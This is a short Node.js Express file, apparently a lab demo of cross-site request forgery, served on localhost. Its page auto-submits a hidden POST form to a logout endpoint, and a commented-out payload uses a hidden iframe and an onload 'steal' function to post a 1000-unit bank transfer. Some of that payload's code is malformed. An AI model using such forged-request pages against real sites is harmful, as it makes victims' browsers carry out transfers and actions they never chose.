var express = require('express');
var app = express();

var ret = '<html><head><script type="text/javascript">function steal(){iframe = document.frames["steal"];iframe.document.Submit("transfer");}</script></head><body onload="steal()"></div><iframe name="steal" display="none"><form method="POST" name="transfer"　action="http://localhost/logout"><input type="hidden" name="toBankId" value="11"><input type="hidden" name="money" value="1000"></form></iframe></body></html>'
app.get('/', function (req, res) {
      res.send('<div>Hello World</div><form action=http://localhost:3000/logout method=POST> <input type="text" name="xx" value="11" /> </form> <script> document.forms[0].submit(); </script>');
      // res.send(ret);
});
app.listen(3456, function () {
      console.log('app is listening at port 3456');
});
